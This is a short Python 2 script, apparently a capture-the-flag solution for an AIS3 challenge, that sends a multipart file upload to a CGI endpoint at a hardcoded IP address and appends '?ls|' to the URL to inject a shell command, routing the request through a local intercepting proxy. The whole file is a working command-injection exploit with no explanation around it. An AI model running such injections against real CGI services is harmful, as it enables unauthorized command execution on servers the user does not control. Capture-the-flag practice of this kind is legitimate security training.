#!/usr/bin/env python
from requests import post
from IPython import embed
import re

# AIS3{here_is_your_flag}

URL = 'http://104.199.235.135:31334/cgi-bin/index.cgi'


files = {
    'file' : 'file',
    'file2' : 'file2'
}

data = {
    'file' : 'ccc',
    'file' : 'ddd'
}

o = post( URL + '?ls|' , files = files , proxies = {'http':'http://127.0.0.1:8080'} )

print o.text

